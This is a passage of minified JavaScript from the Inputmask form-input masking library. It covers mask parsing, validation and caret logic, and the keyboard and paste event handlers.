                    }
                },
                clearIncomplete: !0,
                autoUnmask: !0
            }
        }), t
    }) ? i.apply(e, o) : i) || (t.exports = r)
}, function(t, e, n) {
    "use strict";
    var i, o, r, s = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(t) {
        return typeof t
    } : function(t) {
        return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t
    };
    o = [n(3), n(5), n(6)], void 0 === (r = "function" == typeof(i = function(t, e, n, i) {
        var o = navigator.userAgent,
            r = h("touchstart"),
            a = /iemobile/i.test(o),
            l = /iphone/i.test(o) && !a;

        function c(e, n, o) {
            if (!(this instanceof c)) return new c(e, n, o);
            this.el = i, this.events = {}, this.maskset = i, this.refreshValue = !1, !0 !== o && (t.isPlainObject(e) ? n = e : (n = n || {}, e && (n.alias = e)), this.opts = t.extend(!0, {}, this.defaults, n), this.noMasksCache = n && n.definitions !== i, this.userOptions = n || {}, this.isRTL = this.opts.numericInput, u(this.opts.alias, n, this.opts))
        }

        function u(e, n, o) {
            var r = c.prototype.aliases[e];
            return r ? (r.alias && u(r.alias, i, o), t.extend(!0, o, r), t.extend(!0, o, n), !0) : (null === o.mask && (o.mask = e), !1)
        }

        function p(e, n) {
            function o(e, o, r) {
                var s = !1;
                if (null !== e && "" !== e || ((s = null !== r.regex) ? e = (e = r.regex).replace(/^(\^)(.*)(\$)$/, "$2") : (s = !0, e = ".*")), 1 === e.length && !1 === r.greedy && 0 !== r.repeat && (r.placeholder = ""), r.repeat > 0 || "*" === r.repeat || "+" === r.repeat) {
                    var a = "*" === r.repeat ? 0 : "+" === r.repeat ? 1 : r.repeat;
                    e = r.groupmarker[0] + e + r.groupmarker[1] + r.quantifiermarker[0] + a + "," + r.repeat + r.quantifiermarker[1]
                }
                var l, u = s ? "regex_" + r.regex : r.numericInput ? e.split("").reverse().join("") : e;
                return c.prototype.masksCache[u] === i || !0 === n ? (l = {
                    mask: e,
                    maskToken: c.prototype.analyseMask(e, s, r),
                    validPositions: {},
                    _buffer: i,
                    buffer: i,
                    tests: {},
                    excludes: {},
                    metadata: o,
                    maskLength: i
                }, !0 !== n && (c.prototype.masksCache[u] = l, l = t.extend(!0, {}, c.prototype.masksCache[u]))) : l = t.extend(!0, {}, c.prototype.masksCache[u]), l
            }
            if (t.isFunction(e.mask) && (e.mask = e.mask(e)), t.isArray(e.mask)) {
                if (e.mask.length > 1) {
                    if (null === e.keepStatic) {
                        e.keepStatic = "auto";
                        for (var r = 0; r < e.mask.length; r++)
                            if (e.mask[r].charAt(0) !== e.mask[0].charAt(0)) {
                                e.keepStatic = !0;
                                break
                            }
                    }
                    var s = e.groupmarker[0];
                    return t.each(e.isRTL ? e.mask.reverse() : e.mask, (function(n, o) {
                        s.length > 1 && (s += e.groupmarker[1] + e.alternatormarker + e.groupmarker[0]), o.mask === i || t.isFunction(o.mask) ? s += o : s += o.mask
                    })), o(s += e.groupmarker[1], e.mask, e)
                }
                e.mask = e.mask.pop()
            }
            return e.mask && e.mask.mask !== i && !t.isFunction(e.mask.mask) ? o(e.mask.mask, e.mask, e) : o(e.mask, e.mask, e)
        }

        function h(t) {
            var e = n.createElement("input"),
                i = "on" + t,
                o = i in e;
            return o || (e.setAttribute(i, "return;"), o = "function" == typeof e[i]), e = null, o
        }

        function d(o, u, p) {
            u = u || this.maskset, p = p || this.opts;
            var f, m, g, v, y, b = this,
                x = this.el,
                w = this.isRTL,
                k = !1,
                C = !1,
                _ = !1,
                S = !1;

            function T(t, e, n, o, r) {
                var s = p.greedy;
                r && (p.greedy = !1), e = e || 0;
                var a, l, c, u = [],
                    h = 0;
                $();
                do {
                    if (!0 === t && E().validPositions[h]) l = (c = r && !0 === E().validPositions[h].match.optionality && E().validPositions[h + 1] === i && (!0 === E().validPositions[h].generatedInput || E().validPositions[h].input == p.skipOptionalPartCharacter && h > 0) ? M(h, F(h, a, h - 1)) : E().validPositions[h]).match, a = c.locator.slice(), u.push(!0 === n ? c.input : !1 === n ? l.nativeDef : Q(h, l));
                    else {
                        l = (c = O(h, a, h - 1)).match, a = c.locator.slice();
                        var d = !0 !== o && (!1 !== p.jitMasking ? p.jitMasking : l.jit);
                        (!1 === d || d === i || "number" == typeof d && isFinite(d) && d > h) && u.push(!1 === n ? l.nativeDef : Q(h, l))
                    }
                    "auto" === p.keepStatic && l.newBlockMarker && null !== l.fn && (p.keepStatic = h - 1), h++
                } while ((g === i || h < g) && (null !== l.fn || "" !== l.def) || e > h);
                return "" === u[u.length - 1] && u.pop(), !1 === n && E().maskLength !== i || (E().maskLength = h - 1), p.greedy = s, u
            }

            function E() {
                return u
            }

            function P(t) {
                var e = E();
                e.buffer = i, !0 !== t && (e.validPositions = {}, e.p = 0)
            }

            function $(t, e, n) {
                var o = -1,
                    r = -1,
                    s = n || E().validPositions;
                for (var a in t === i && (t = -1), s) {
                    var l = parseInt(a);
                    s[l] && (e || !0 !== s[l].generatedInput) && (l <= t && (o = l), l >= t && (r = l))
                }
                return -1 === o || o == t ? r : -1 == r || t - o < r - t ? o : r
            }

            function A(t) {
                var e = t.locator[t.alternation];
                return "string" == typeof e && e.length > 0 && (e = e.split(",")[0]), e !== i ? e.toString() : ""
            }

            function D(t, e) {
                var n = (t.alternation != i ? t.mloc[A(t)] : t.locator).join("");
                if ("" !== n)
                    for (; n.length < e;) n += "0";
                return n
            }

            function M(t, e) {
                for (var n, o, r, s = D(j(t = t > 0 ? t - 1 : 0)), a = 0; a < e.length; a++) {
                    var l = e[a];
                    n = D(l, s.length);
                    var c = Math.abs(n - s);
                    (o === i || "" !== n && c < o || r && r.match.optionality && "master" === r.match.newBlockMarker && (!l.match.optionality || !l.match.newBlockMarker) || r && r.match.optionalQuantifier && !l.match.optionalQuantifier) && (o = c, r = l)
                }
                return r
            }

            function O(t, e, n) {
                return E().validPositions[t] || M(t, F(t, e ? e.slice() : e, n))
            }

            function j(t, e) {
                return E().validPositions[t] ? E().validPositions[t] : (e || F(t))[0]
            }

            function L(t, e) {
                for (var n = !1, i = F(t), o = 0; o < i.length; o++)
                    if (i[o].match && i[o].match.def === e) {
                        n = !0;
                        break
                    }
                return n
            }

            function F(e, n, o) {
                var r, s = E().maskToken,
                    a = n ? o : 0,
                    l = n ? n.slice() : [0],
                    c = [],
                    u = !1,
                    h = n ? n.join("") : "",
                    d = 0;

                function f(n, o, s, l) {
                    function m(s, l, g) {
                        function v(e, n) {
                            var i = 0 === t.inArray(e, n.matches);
                            return i || t.each(n.matches, (function(t, o) {
                                if (!0 === o.isQuantifier ? i = v(e, n.matches[t - 1]) : o.hasOwnProperty("matches") && (i = v(e, o)), i) return !1
                            })), i
                        }

                        function y(e, n, o) {
                            var r, s;
                            if ((E().tests[e] || E().validPositions[e]) && t.each(E().tests[e] || [E().validPositions[e]], (function(t, e) {
                                    if (e.mloc[n]) return r = e, !1;
                                    var a = o !== i ? o : e.alternation,
                                        l = e.locator[a] !== i ? e.locator[a].toString().indexOf(n) : -1;
                                    (s === i || l < s) && -1 !== l && (r = e, s = l)
                                })), r) {
                                var a = r.locator[r.alternation];
                                return (r.mloc[n] || r.mloc[a] || r.locator).slice((o !== i ? o : r.alternation) + 1)
                            }
                            return o !== i ? y(e, n) : i
                        }

                        function b(t, e) {
                            function n(t) {
                                for (var e, n, i = [], o = 0, r = t.length; o < r; o++)
                                    if ("-" === t.charAt(o))
                                        for (n = t.charCodeAt(o + 1); ++e < n;) i.push(String.fromCharCode(e));
                                    else e = t.charCodeAt(o), i.push(t.charAt(o));
                                return i.join("")
                            }
                            return p.regex && null !== t.match.fn && null !== e.match.fn ? -1 !== n(e.match.def.replace(/[\[\]]/g, "")).indexOf(n(t.match.def.replace(/[\[\]]/g, ""))) : t.match.def === e.match.nativeDef
                        }

                        function x(t, n) {
                            return !(t.locator.slice(t.alternation).join("") != n.locator.slice(n.alternation).join("") || null !== t.match.fn || null === n.match.fn) && n.match.fn.test(t.match.def, E(), e, !1, p, !1)
                        }

                        function w(t, e) {
                            if (e === i || t.alternation === e.alternation && -1 === t.locator[t.alternation].toString().indexOf(e.locator[e.alternation])) {
                                t.mloc = t.mloc || {};
                                var n = t.locator[t.alternation];
                                if (n !== i) {
                                    if ("string" == typeof n && (n = n.split(",")[0]), t.mloc[n] === i && (t.mloc[n] = t.locator.slice()), e !== i) {
                                        for (var o in e.mloc) "string" == typeof o && (o = o.split(",")[0]), t.mloc[o] === i && (t.mloc[o] = e.mloc[o]);
                                        t.locator[t.alternation] = Object.keys(t.mloc).join(",")
                                    }
                                    return !0
                                }
                                t.alternation = i
                            }
                            return !1
                        }
                        if (a > 500 && g !== i) throw "Inputmask: There is probably an error in your mask definition or in the code. Create an issue on github with an example of the mask you are using. " + E().mask;
                        if (a === e && s.matches === i) return c.push({
                            match: s,
                            locator: l.reverse(),
                            cd: h,
                            mloc: {}
                        }), !0;
                        if (s.matches !== i) {
                            if (s.isGroup && g !== s) {
                                if (s = m(n.matches[t.inArray(s, n.matches) + 1], l, g)) return !0
                            } else if (s.isOptional) {
                                var k = s;
                                if (s = f(s, o, l, g)) {
                                    if (t.each(c, (function(t, e) {
                                            e.match.optionality = !0
                                        })), r = c[c.length - 1].match, g !== i || !v(r, k)) return !0;
                                    u = !0, a = e
                                }
                            } else if (s.isAlternator) {
                                var C, _ = s,
                                    S = [],
                                    T = c.slice(),
                                    P = l.length,
                                    $ = o.length > 0 ? o.shift() : -1;
                                if (-1 === $ || "string" == typeof $) {
                                    var A, D = a,
                                        M = o.slice(),
                                        O = [];
                                    if ("string" == typeof $) O = $.split(",");
                                    else
                                        for (A = 0; A < _.matches.length; A++) O.push(A.toString());
                                    if (E().excludes[e]) {
                                        for (var j = O.slice(), L = 0, F = E().excludes[e].length; L < F; L++) O.splice(O.indexOf(E().excludes[e][L].toString()), 1);
                                        0 === O.length && (E().excludes[e] = i, O = j)
                                    }(!0 === p.keepStatic || isFinite(parseInt(p.keepStatic)) && D >= p.keepStatic) && (O = O.slice(0, 1));
                                    for (var N = !1, I = 0; I < O.length; I++) {
                                        A = parseInt(O[I]), c = [], o = "string" == typeof $ && y(a, A, P) || M.slice(), _.matches[A] && m(_.matches[A], [A].concat(l), g) ? s = !0 : 0 === I && (N = !0), C = c.slice(), a = D, c = [];
                                        for (var R = 0; R < C.length; R++) {
                                            var H = C[R],
                                                B = !1;
                                            H.match.jit = H.match.jit || N, H.alternation = H.alternation || P, w(H);
                                            for (var q = 0; q < S.length; q++) {
                                                var z = S[q];
                                                if ("string" != typeof $ || H.alternation !== i && -1 !== t.inArray(H.locator[H.alternation].toString(), O)) {
                                                    if (H.match.nativeDef === z.match.nativeDef) {
                                                        B = !0, w(z, H);
                                                        break
                                                    }
                                                    if (b(H, z)) {
                                                        w(H, z) && (B = !0, S.splice(S.indexOf(z), 0, H));
                                                        break
                                                    }
                                                    if (b(z, H)) {
                                                        w(z, H);
                                                        break
                                                    }
                                                    if (x(H, z)) {
                                                        w(H, z) && (B = !0, S.splice(S.indexOf(z), 0, H));
                                                        break
                                                    }
                                                }
                                            }
                                            B || S.push(H)
                                        }
                                    }
                                    c = T.concat(S), a = e, u = c.length > 0, s = S.length > 0, o = M.slice()
                                } else s = m(_.matches[$] || n.matches[$], [$].concat(l), g);
                                if (s) return !0
                            } else if (s.isQuantifier && g !== n.matches[t.inArray(s, n.matches) - 1])
                                for (var W = s, G = o.length > 0 ? o.shift() : 0; G < (isNaN(W.quantifier.max) ? G + 1 : W.quantifier.max) && a <= e; G++) {
                                    var X = n.matches[t.inArray(W, n.matches) - 1];
                                    if (s = m(X, [G].concat(l), X)) {
                                        if ((r = c[c.length - 1].match).optionalQuantifier = G > W.quantifier.min - 1, r.jit = (G || 1) * X.matches.indexOf(r) >= W.quantifier.jit, r.optionalQuantifier && v(r, X)) {
                                            u = !0, a = e;
                                            break
                                        }
                                        if (r.jit && !r.optionalQuantifier) {
                                            d = X.matches.indexOf(r), a = e, u = !0;
                                            break
                                        }
                                        return !0
                                    }
                                } else if (s = f(s, o, l, g)) return !0
                        } else a++
                    }
                    for (var g = o.length > 0 ? o.shift() : 0; g < n.matches.length; g = g + 1 + d)
                        if (d = 0, !0 !== n.matches[g].isQuantifier) {
                            var v = m(n.matches[g], [g].concat(s), l);
                            if (v && a === e) return v;
                            if (a > e) break
                        }
                }

                function m(e, n) {
                    var o = [];
                    return t.isArray(n) || (n = [n]), n.length > 0 && (n[0].alternation === i ? 0 === (o = M(e, n.slice()).locator.slice()).length && (o = n[0].locator.slice()) : t.each(n, (function(t, e) {
                        if ("" !== e.def)
                            if (0 === o.length) o = e.locator.slice();
                            else
                                for (var n = 0; n < o.length; n++) e.locator[n] && -1 === o[n].toString().indexOf(e.locator[n]) && (o[n] += "," + e.locator[n])
                    }))), o
                }
                if (e > -1) {
                    if (n === i) {
                        for (var g, v = e - 1;
                            (g = E().validPositions[v] || E().tests[v]) === i && v > -1;) v--;
                        g !== i && v > -1 && (l = m(v, g), h = l.join(""), a = v)
                    }
                    if (E().tests[e] && E().tests[e][0].cd === h) return E().tests[e];
                    for (var y = l.shift(); y < s.length && !(f(s[y], l, [y]) && a === e || a > e); y++);
                }
                return (0 === c.length || u) && c.push({
                    match: {
                        fn: null,
                        optionality: !1,
                        casing: null,
                        def: "",
                        placeholder: ""
                    },
                    locator: [],
                    mloc: {},
                    cd: h
                }), n !== i && E().tests[e] ? t.extend(!0, [], c) : (E().tests[e] = t.extend(!0, [], c), E().tests[e])
            }

            function N() {
                return E()._buffer === i && (E()._buffer = T(!1, 1), E().buffer === i && (E().buffer = E()._buffer.slice())), E()._buffer
            }

            function I(t) {
                return E().buffer !== i && !0 !== t || (E().buffer = T(!0, $(), !0)), E().buffer
            }

            function R(t, e, n) {
                var o, r;
                if (!0 === t) P(), t = 0, e = n.length;
                else
                    for (o = t; o < e; o++) delete E().validPositions[o];
                for (r = t, o = t; o < e; o++)
                    if (P(!0), n[o] !== p.skipOptionalPartCharacter) {
                        var s = z(r, n[o], !0, !0);
                        !1 !== s && (P(!0), r = s.caret !== i ? s.caret : s.pos + 1)
                    }
            }

            function H(e, n, i) {
                switch (p.casing || n.casing) {
                    case "upper":
                        e = e.toUpperCase();
                        break;
                    case "lower":
                        e = e.toLowerCase();
                        break;
                    case "title":
                        var o = E().validPositions[i - 1];
                        e = 0 === i || o && o.input === String.fromCharCode(c.keyCode.SPACE) ? e.toUpperCase() : e.toLowerCase();
                        break;
                    default:
                        if (t.isFunction(p.casing)) {
                            var r = Array.prototype.slice.call(arguments);
                            r.push(E().validPositions), e = p.casing.apply(this, r)
                        }
                }
                return e
            }

            function B(e, n, o) {
                for (var r, s = p.greedy ? n : n.slice(0, 1), a = !1, l = o !== i ? o.split(",") : [], c = 0; c < l.length; c++) - 1 !== (r = e.indexOf(l[c])) && e.splice(r, 1);
                for (var u = 0; u < e.length; u++)
                    if (-1 !== t.inArray(e[u], s)) {
                        a = !0;
                        break
                    }
                return a
            }

            function q(e, n, o, r, s) {
                var a, l, c, u, p, h, d, f = t.extend(!0, {}, E().validPositions),
                    m = !1,
                    g = s !== i ? s : $();
                if (-1 === g && s === i) l = (u = j(a = 0)).alternation;
                else
                    for (; g >= 0; g--)
                        if ((c = E().validPositions[g]) && c.alternation !== i) {
                            if (u && u.locator[c.alternation] !== c.locator[c.alternation]) break;
                            a = g, l = E().validPositions[a].alternation, u = c
                        } if (l !== i) {
                    d = parseInt(a), E().excludes[d] = E().excludes[d] || [], !0 !== e && E().excludes[d].push(A(u));
                    var v = [],
                        y = 0;
                    for (p = d; p < $(i, !0) + 1; p++)(h = E().validPositions[p]) && !0 !== h.generatedInput ? v.push(h.input) : p < e && y++, delete E().validPositions[p];
                    for (; E().excludes[d] && E().excludes[d].length < 10;) {
                        var b = -1 * y,
                            x = v.slice();
                        for (E().tests[d] = i, P(!0), m = !0; x.length > 0;) {
                            var w = x.shift();
                            if (!(m = z($(i, !0) + 1, w, !1, r, !0))) break
                        }
                        if (m && n !== i) {
                            var k = $(e) + 1;
                            for (p = d; p < $() + 1; p++)((h = E().validPositions[p]) === i || null == h.match.fn) && p < e + b && b++;
                            m = z((e += b) > k ? k : e, n, o, r, !0)
                        }
                        if (m) break;
                        if (P(), u = j(d), E().validPositions = t.extend(!0, {}, f), !E().excludes[d]) {
                            m = q(e, n, o, r, d - 1);
                            break
                        }
                        var C = A(u);
                        if (-1 !== E().excludes[d].indexOf(C)) {
                            m = q(e, n, o, r, d - 1);
                            break
                        }
                        for (E().excludes[d].push(C), p = d; p < $(i, !0) + 1; p++) delete E().validPositions[p]
                    }
                }
                return E().excludes[d] = i, m
            }

            function z(e, n, o, r, s, a) {
                function l(t) {
                    return w ? t.begin - t.end > 1 || t.begin - t.end == 1 : t.end - t.begin > 1 || t.end - t.begin == 1
                }
                o = !0 === o;
                var c = e;

                function u(n, o, s) {
                    var a = !1;
                    return t.each(F(n), (function(c, u) {
                        var h = u.match;
                        if (I(!0), !1 !== (a = null != h.fn ? h.fn.test(o, E(), n, s, p, l(e)) : (o === h.def || o === p.skipOptionalPartCharacter) && "" !== h.def && {
                                c: Q(n, h, !0) || h.def,
                                pos: n
                            })) {
                            var d = a.c !== i ? a.c : o,
                                f = n;
                            return d = d === p.skipOptionalPartCharacter && null === h.fn ? Q(n, h, !0) || h.def : d, a.remove !== i && (t.isArray(a.remove) || (a.remove = [a.remove]), t.each(a.remove.sort((function(t, e) {
                                return e - t
                            })), (function(t, e) {
                                G({
                                    begin: e,
                                    end: e + 1
                                })
                            }))), a.insert !== i && (t.isArray(a.insert) || (a.insert = [a.insert]), t.each(a.insert.sort((function(t, e) {
                                return t - e
                            })), (function(t, e) {
                                z(e.pos, e.c, !0, r)
                            }))), !0 !== a && a.pos !== i && a.pos !== n && (f = a.pos), !0 !== a && a.pos === i && a.c === i || G(e, t.extend({}, u, {
                                input: H(d, h, f)
                            }), r, f) || (a = !1), !1
                        }
                    })), a
                }
                e.begin !== i && (c = w ? e.end : e.begin);
                var h = !0,
                    d = t.extend(!0, {}, E().validPositions);
                if (t.isFunction(p.preValidation) && !o && !0 !== r && !0 !== a && (h = p.preValidation(I(), c, n, l(e), p, E())), !0 === h) {
                    if (W(i, c, !0), (g === i || c < g) && (h = u(c, n, o), (!o || !0 === r) && !1 === h && !0 !== a)) {
                        var f = E().validPositions[c];
                        if (!f || null !== f.match.fn || f.match.def !== n && n !== p.skipOptionalPartCharacter) {
                            if ((p.insertMode || E().validPositions[V(c)] === i) && !X(c, !0))
                                for (var m = c + 1, v = V(c); m <= v; m++)
                                    if (!1 !== (h = u(m, n, o))) {
                                        h = W(c, h.pos !== i ? h.pos : m) || h, c = m;
                                        break
                                    }
                        } else h = {
                            caret: V(c)
                        }
                    }!1 !== h || !1 === p.keepStatic || null != p.regex && !rt(I()) || o || !0 === s || (h = q(c, n, o, r)), !0 === h && (h = {
                        pos: c
                    })
                }
                if (t.isFunction(p.postValidation) && !1 !== h && !o && !0 !== r && !0 !== a) {
                    var y = p.postValidation(I(!0), e.begin !== i ? w ? e.end : e.begin : e, h, p);
                    if (y !== i) {
                        if (y.refreshFromBuffer && y.buffer) {
                            var b = y.refreshFromBuffer;
                            R(!0 === b ? b : b.start, b.end, y.buffer)
                        }
                        h = !0 === y ? h : y
                    }
                }
                return h && h.pos === i && (h.pos = c), !1 !== h && !0 !== a || (P(!0), E().validPositions = t.extend(!0, {}, d)), h
            }

            function W(e, n, o) {
                var r;
                if (e === i)
                    for (e = n - 1; e > 0 && !E().validPositions[e]; e--);
                for (var s = e; s < n; s++)
                    if (E().validPositions[s] === i && !X(s, !0) && (0 == s ? j(s) : E().validPositions[s - 1])) {
                        var a = F(s).slice();
                        "" === a[a.length - 1].match.def && a.pop();
                        var l = M(s, a);
                        if ((l = t.extend({}, l, {
                                input: Q(s, l.match, !0) || l.match.def
                            })).generatedInput = !0, G(s, l, !0), !0 !== o) {
                            var c = E().validPositions[n].input;
                            E().validPositions[n] = i, r = z(n, c, !0, !0)
                        }
                    }
                return r
            }

            function G(e, n, o, r) {
                function s(t, e, n) {
                    var o = e[t];
                    if (o !== i && (null === o.match.fn && !0 !== o.match.optionality || o.input === p.radixPoint)) {
                        var r = n.begin <= t - 1 ? e[t - 1] && null === e[t - 1].match.fn && e[t - 1] : e[t - 1],
                            s = n.end > t + 1 ? e[t + 1] && null === e[t + 1].match.fn && e[t + 1] : e[t + 1];
                        return r && s
                    }
                    return !1
                }
                var a = e.begin !== i ? e.begin : e,
                    l = e.end !== i ? e.end : e;
                if (e.begin > e.end && (a = e.end, l = e.begin), r = r !== i ? r : a, a !== l || p.insertMode && E().validPositions[r] !== i && o === i) {
                    var c = t.extend(!0, {}, E().validPositions),
                        u = $(i, !0);
                    for (E().p = a, g = u; g >= a; g--) E().validPositions[g] && "+" === E().validPositions[g].match.nativeDef && (p.isNegative = !1), delete E().validPositions[g];
                    var h = !0,
                        d = r,
                        f = (E().validPositions, !1),
                        m = d,
                        g = d;
                    for (n && (E().validPositions[r] = t.extend(!0, {}, n), m++, d++, a < l && g++); g <= u; g++) {
                        var v = c[g];
                        if (v !== i && (g >= l || g >= a && !0 !== v.generatedInput && s(g, c, {
                                begin: a,
                                end: l
                            }))) {
                            for (;
                                "" !== j(m).match.def;) {
                                if (!1 === f && c[m] && c[m].match.nativeDef === v.match.nativeDef) E().validPositions[m] = t.extend(!0, {}, c[m]), E().validPositions[m].input = v.input, W(i, m, !0), d = m + 1, h = !0;
                                else if (L(m, v.match.def)) {
                                    var y = z(m, v.input, !0, !0);
                                    h = !1 !== y, d = y.caret || y.insert ? $() : m + 1, f = !0
                                } else h = !0 === v.generatedInput || v.input === p.radixPoint && !0 === p.numericInput;
                                if (h) break;
                                if (!h && m > l && X(m, !0) && (null !== v.match.fn || m > E().maskLength)) break;
                                m++
                            }
                            "" == j(m).match.def && (h = !1), m = d
                        }
                        if (!h) break
                    }
                    if (!h) return E().validPositions = t.extend(!0, {}, c), P(!0), !1
                } else n && (E().validPositions[r] = t.extend(!0, {}, n));
                return P(!0), !0
            }

            function X(t, e) {
                var n = O(t).match;
                if ("" === n.def && (n = j(t).match), null != n.fn) return n.fn;
                if (!0 !== e && t > -1) {
                    var i = F(t);
                    return i.length > 1 + ("" === i[i.length - 1].match.def ? 1 : 0)
                }
                return !1
            }

            function V(t, e) {
                for (var n = t + 1;
                    "" !== j(n).match.def && (!0 === e && (!0 !== j(n).match.newBlockMarker || !X(n)) || !0 !== e && !X(n));) n++;
                return n
            }

            function U(t, e) {
                var n, i = t;
                if (i <= 0) return 0;
                for (; --i > 0 && (!0 === e && !0 !== j(i).match.newBlockMarker || !0 !== e && !X(i) && ((n = F(i)).length < 2 || 2 === n.length && "" === n[1].match.def)););
                return i
            }

            function Y(e, n, o, r, s) {
                if (r && t.isFunction(p.onBeforeWrite)) {
                    var a = p.onBeforeWrite.call(b, r, n, o, p);
                    if (a) {
                        if (a.refreshFromBuffer) {
                            var l = a.refreshFromBuffer;
                            R(!0 === l ? l : l.start, l.end, a.buffer || n), n = I(!0)
                        }
                        o !== i && (o = a.caret !== i ? a.caret : o)
                    }
                }
                if (e !== i && (e.inputmask._valueSet(n.join("")), o === i || r !== i && "blur" === r.type ? lt(e, o, 0 === n.length) : nt(e, o), !0 === s)) {
                    var c = t(e),
                        u = e.inputmask._valueGet();
                    C = !0, c.trigger("input"), setTimeout((function() {
                        u === N().join("") ? c.trigger("cleared") : !0 === rt(n) && c.trigger("complete")
                    }), 0)
                }
            }

            function Q(e, n, o) {
                if ((n = n || j(e).match).placeholder !== i || !0 === o) return t.isFunction(n.placeholder) ? n.placeholder(p) : n.placeholder;
                if (null === n.fn) {
                    if (e > -1 && E().validPositions[e] === i) {
                        var r, s = F(e),
                            a = [];
                        if (s.length > 1 + ("" === s[s.length - 1].match.def ? 1 : 0))
                            for (var l = 0; l < s.length; l++)
                                if (!0 !== s[l].match.optionality && !0 !== s[l].match.optionalQuantifier && (null === s[l].match.fn || r === i || !1 !== s[l].match.fn.test(r.match.def, E(), e, !0, p)) && (a.push(s[l]), null === s[l].match.fn && (r = s[l]), a.length > 1 && /[0-9a-bA-Z]/.test(a[0].match.def))) return p.placeholder.charAt(e % p.placeholder.length)
                    }
                    return n.def
                }
                return p.placeholder.charAt(e % p.placeholder.length)
            }
            var Z, K = {
                    on: function(e, n, o) {
                        var s = function(e) {
                            var n = this;
                            if (n.inputmask === i && "FORM" !== this.nodeName) {
                                var s = t.data(n, "_inputmask_opts");
                                s ? new c(s).mask(n) : K.off(n)
                            } else {
                                if ("setvalue" === e.type || "FORM" === this.nodeName || !(n.disabled || n.readOnly && !("keydown" === e.type && e.ctrlKey && 67 === e.keyCode || !1 === p.tabThrough && e.keyCode === c.keyCode.TAB))) {
                                    switch (e.type) {
                                        case "input":
                                            if (!0 === C) return C = !1, e.preventDefault();
                                            if (r) {
                                                var u = arguments;
                                                return setTimeout((function() {
                                                    o.apply(n, u), nt(n, n.inputmask.caretPos, i, !0)
                                                }), 0), !1
                                            }
                                            break;
                                        case "keydown":
                                            k = !1, C = !1;
                                            break;
                                        case "keypress":
                                            if (!0 === k) return e.preventDefault();
                                            k = !0;
                                            break;
                                        case "click":
                                            if (a || l) return u = arguments, setTimeout((function() {
                                                o.apply(n, u)
                                            }), 0), !1
                                    }
                                    var h = o.apply(n, arguments);
                                    return !1 === h && (e.preventDefault(), e.stopPropagation()), h
                                }
                                e.preventDefault()
                            }
                        };
                        e.inputmask.events[n] = e.inputmask.events[n] || [], e.inputmask.events[n].push(s), -1 !== t.inArray(n, ["submit", "reset"]) ? null !== e.form && t(e.form).on(n, s) : t(e).on(n, s)
                    },
                    off: function(e, n) {
                        var i;
                        e.inputmask && e.inputmask.events && (n ? (i = [])[n] = e.inputmask.events[n] : i = e.inputmask.events, t.each(i, (function(n, i) {
                            for (; i.length > 0;) {
                                var o = i.pop(); - 1 !== t.inArray(n, ["submit", "reset"]) ? null !== e.form && t(e.form).off(n, o) : t(e).off(n, o)
                            }
                            delete e.inputmask.events[n]
                        })))
                    }
                },
                J = {
                    keydownEvent: function(e) {
                        var n = this,
                            i = t(n),
                            o = e.keyCode,
                            r = nt(n);
                        if (o === c.keyCode.BACKSPACE || o === c.keyCode.DELETE || l && o === c.keyCode.BACKSPACE_SAFARI || e.ctrlKey && o === c.keyCode.X && !h("cut")) e.preventDefault(), st(n, o, r), Y(n, I(!0), E().p, e, n.inputmask._valueGet() !== I().join(""));
                        else if (o === c.keyCode.END || o === c.keyCode.PAGE_DOWN) {
                            e.preventDefault();
                            var s = V($());
                            nt(n, e.shiftKey ? r.begin : s, s, !0)
                        } else o === c.keyCode.HOME && !e.shiftKey || o === c.keyCode.PAGE_UP ? (e.preventDefault(), nt(n, 0, e.shiftKey ? r.begin : 0, !0)) : (p.undoOnEscape && o === c.keyCode.ESCAPE || 90 === o && e.ctrlKey) && !0 !== e.altKey ? (tt(n, !0, !1, f.split("")), i.trigger("click")) : o !== c.keyCode.INSERT || e.shiftKey || e.ctrlKey ? !0 === p.tabThrough && o === c.keyCode.TAB && (!0 === e.shiftKey ? (null === j(r.begin).match.fn && (r.begin = V(r.begin)), r.end = U(r.begin, !0), r.begin = U(r.end, !0)) : (r.begin = V(r.begin, !0), r.end = V(r.begin, !0), r.end < E().maskLength && r.end--), r.begin < E().maskLength && (e.preventDefault(), nt(n, r.begin, r.end))) : (p.insertMode = !p.insertMode, n.setAttribute("im-insert", p.insertMode));
                        p.onKeyDown.call(this, e, I(), nt(n).begin, p), _ = -1 !== t.inArray(o, p.ignorables)
                    },
                    keypressEvent: function(e, n, o, r, s) {
                        var a = this,
                            l = t(a),
                            u = e.which || e.charCode || e.keyCode;
                        if (!(!0 === n || e.ctrlKey && e.altKey) && (e.ctrlKey || e.metaKey || _)) return u === c.keyCode.ENTER && f !== I().join("") && (f = I().join(""), setTimeout((function() {
                            l.trigger("change")
                        }), 0)), !0;
                        if (u) {
                            46 === u && !1 === e.shiftKey && "" !== p.radixPoint && (u = p.radixPoint.charCodeAt(0));
                            var h, d = n ? {
                                    begin: s,
                                    end: s
                                } : nt(a),
                                m = String.fromCharCode(u),
                                g = 0;
                            if (p._radixDance && p.numericInput) {
                                var v = I().indexOf(p.radixPoint.charAt(0)) + 1;
                                d.begin <= v && (u === p.radixPoint.charCodeAt(0) && (g = 1), d.begin -= 1, d.end -= 1)
                            }
                            E().writeOutBuffer = !0;
                            var y = z(d, m, r);
                            if (!1 !== y && (P(!0), h = y.caret !== i ? y.caret : V(y.pos.begin ? y.pos.begin : y.pos), E().p = h), h = (p.numericInput && y.caret === i ? U(h) : h) + g, !1 !== o && (setTimeout((function() {
                                    p.onKeyValidation.call(a, u, y, p)
                                }), 0), E().writeOutBuffer && !1 !== y)) {
                                var b = I();
                                Y(a, b, h, e, !0 !== n)
                            }
                            if (e.preventDefault(), n) return !1 !== y && (y.forwardPosition = h), y
                        }
                    },
                    pasteEvent: function(n) {
                        var i, o = this,
                            r = n.originalEvent || n,
                            s = (t(o), o.inputmask._valueGet(!0)),
                            a = nt(o);
                        w && (i = a.end, a.end = a.begin, a.begin = i);
                        var l = s.substr(0, a.begin),
                            c = s.substr(a.end, s.length);
                        if (l === (w ? N().reverse() : N()).slice(0, a.begin).join("") && (l = ""), c === (w ? N().reverse() : N()).slice(a.end).join("") && (c = ""), e.clipboardData && e.clipboardData.getData) s = l + e.clipboardData.getData("Text") + c;
                        else {
                            if (!r.clipboardData || !r.clipboardData.getData) return !0;
                            s = l + r.clipboardData.getData("text/plain") + c
                        }
                        var u = s;
                        if (t.isFunction(p.onBeforePaste)) {
                            if (!1 === (u = p.onBeforePaste.call(b, s, p))) return n.preventDefault();
                            u || (u = s)
                        }
